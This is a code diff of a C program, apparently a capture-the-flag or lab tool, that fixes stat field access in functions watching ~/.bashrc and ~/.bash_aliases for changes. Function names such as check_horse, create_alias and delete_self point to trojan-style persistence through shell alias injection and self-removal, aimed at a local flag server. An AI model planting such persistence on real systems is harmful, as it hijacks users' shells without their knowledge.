@@ -15,10 +15,9 @@
 # define DESTIP			"127.0.0.1"
 # define FLAG_FILE		"flag"
 # define SERVER			"http://127.0.0.1:1234/"
-
 unsigned int count;
 struct timespec last_mtim[2];
-bool create_flag;
+unsigned int create_flag;
 
 void delete_self(){
 	unsigned int f;
@@ -65,11 +64,11 @@ void get_flag(){
 int check_horse(){
 	struct stat st;
 	stat("~/.bashrc", &st);
-	if(st.tv_sec != last_mtim[0].tv_sec || st.tv_nsec != last_mtim[0].tv_nsec){
+	if(st.st_mtim.tv_sec != last_mtim[0].tv_sec || st.st_mtim.tv_nsec != last_mtim[0].tv_nsec){
 		return 1;
 	}
 	if(stat("~/.bash_aliases", &st) == 0){
-		if(st.tv_sec == last_mtim[1].tv_sec && st.tv_nsec == last_mtim[1].tv_nsec)
+		if(st.st_mtim.tv_sec == last_mtim[1].tv_sec && st.st_mtim.tv_nsec == last_mtim[1].tv_nsec)
 			return 0;
 	}
 	return 1;
@@ -87,7 +86,7 @@ void create_alias(){
 void store_time(){
 	struct stat st;
 	stat("~/.bashrc", &st);
-	if(st.tv_sec != last_mtim[0].tv_sec || st.tv_nsec != last_mtim[0].tv_nsec){
+	if(st.st_mtim.tv_sec != last_mtim[0].tv_sec || st.st_mtim.tv_nsec != last_mtim[0].tv_nsec){
 		last_mtim[0] = st.st_mtim;
 		stat("~/.bash_aliases", &st);
 		last_mtim[1] = st.st_mtim;	
